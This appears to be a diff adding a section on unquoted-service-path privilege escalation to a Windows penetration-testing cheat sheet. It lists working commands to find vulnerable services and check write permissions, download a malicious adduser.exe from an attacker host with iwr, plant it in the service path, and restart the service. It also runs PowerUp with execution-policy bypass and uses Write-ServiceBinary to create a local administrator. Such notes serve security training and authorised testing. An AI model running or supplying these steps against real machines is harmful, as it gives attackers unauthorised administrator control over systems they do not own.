@@ -1243,7 +1243,41 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
  - check new user created  
    `net user` `net localgroup administrators`  
 - Unquoted Service Paths
-  - 
+  - List of services with binary path > stopped service named "GammaService"  
+    `Get-CimInstance -ClassName win32_service | Select Name,State,PathName`
+  - OR List of services with spaces and missing quotes in the binary path  
+    `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`
+    ```
+    C:\Program.exe
+    C:\Program Files\Enterprise.exe
+    C:\Program Files\Enterprise Apps\Current.exe
+    C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+    ```
+  - check if user has permission to restart service  
+    `Start-Service GammaService` `Stop-Service GammaService`
+  - Review permission on C:\ and C:\Program Files  
+    `icacls "C:\"` `icacls "C:\Program Files"` `icacls "C:\Program Files\Enterprise Apps"`
+  - place a malicious file named Current.exe in C:\Program Files\Enterprise Apps\  
+    ```
+    iwr -uri http://<KALI>/adduser.exe -Outfile Current.exe
+    copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+    ```
+  - start "GammaService"  
+    `Start-Service GammaService` `net user` `net localgroup administrators`
+  - Use PowerUp "Get-UnquotedService" to identifies this vulnerability  
+    ```
+    iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
+    powershell -ep bypass
+    . .\PowerUp.ps1
+    Get-UnquotedService
+    ```
+  - Use the AbuseFunction "Write-ServiceBinary" to exploit the unquoted service path of GammaService
+    ```
+    Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+    Restart-Service GammaService
+    net user
+    net localgroup administrators
+    ```
 - Scheduled Tasks
 - Using Exploits   
 ### 18. Linux privilege escalation
